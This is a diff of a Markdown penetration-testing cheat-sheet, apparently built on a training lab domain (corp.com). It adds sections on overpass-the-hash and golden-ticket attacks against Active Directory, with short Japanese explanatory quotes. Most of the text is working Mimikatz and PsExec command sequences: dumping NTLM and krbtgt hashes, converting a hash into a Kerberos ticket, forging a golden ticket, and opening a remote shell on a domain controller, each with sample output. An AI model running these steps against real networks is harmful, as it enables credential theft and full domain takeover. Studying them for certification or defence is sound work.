@@ -202,19 +202,74 @@ pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2
 ```
 
 ## Over Pass The Hash
-Converting NTLM hash to TGT and get another user's shell.
+
+> overpass the hash テクニックの本質は、NTLM ハッシュを Kerberos チケットに変換し、 NTLM 認証を回避することにあります。これを行なう簡単な方法は、やはり Mimikatz の sekurlsa::pth コマンドです。
+
+Converting NTLM hash to TGT and get another user's shell. That user's hash can be got by `sekurlsa::logonpasswords`.
 
 ```mimikatz# sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe ```
 
 <- I can execute commands on this PowerSHell as Jeff_Admin user
 
+Generating TGT:
+
 ```
-PS C:¥Windows¥system32> net use \\dc01  (<- generate TGT)
-PS C:¥Tools¥active_directory> .¥PsExec.exe \\dc01 cmd.exe
+PS C:¥Windows¥system32> net use \\dc01
+```
+
+Now, NTLM hash was converted to Kerberos TGT. So we can use PsExec.exe!
+
+> PsExec はリモートでコマンドを実行できますが、パスワードハッシュは受け付けません。 Kerberos チケットを生成し、Jeff_Admin のコンテキストの PowerShell セッションで操作 しているので、TGT を再利用してドメインコントローラ上でコード実行ができます。
+
+```
+PS C:¥Tools¥active_directory> .¥PsExec.exe ¥¥dc01 cmd.exe
+PsExec v2.2 - Execute processes remotely
+Copyright (C) 2001-2016 Mark Russinovich
+Sysinternals - www.sysinternals.com
+C:¥Windows¥system32>
 ```
 
 ## Pass The Ticket
-Making the silver ticket.
+### Golden Ticket Crafting
+I make the original TGT namely **Golden Ticket**. <u>This need krbtgt's hash</u>.
+
+Get the krbtgt's hash:
+
+```
+mimikatz # privilege::debug
+Privilege '20' OK
+mimikatz # lsadump::lsa /patch
+Domain : CORP / S-1-5-21-1602875587-2787523311-2599479668 RID : 000001f4 (500)
+User : Administrator
+LM :
+NTLM : e2b475c11da2a0748290d87aa966c327 RID : 000001f5 (501)
+User : Guest
+LM :
+NTLM :
+RID : 000001f6 (502)
+User : krbtgt
+LM :
+NTLM : 75b60230a2394a812000dbfad8415965
+```
+
+Crafting the Golden Ticket:
+
+```
+mimikatz # kerberos::purge
+Ticket(s) purge for current session is OK
+mimikatz # kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587- 2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
+```
+
+Get the shell:
+
+```
+mimikatz # misc::cmd
+Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 012E3A24
+C:¥Users¥offsec.crop> psexec.exe ¥¥dc01 cmd.exe
+PsExec v2.2 - Execute processes remotely Copyright (C) 2001-2016 Mark Russinovich Sysinternals - www.sysinternals.com C:¥Windows¥system32> 
+```
+
+### Silver Ticket Crafting
 
 (This may be not able to get the shell, but you can access to some services (SPN) with high privilege.)
 
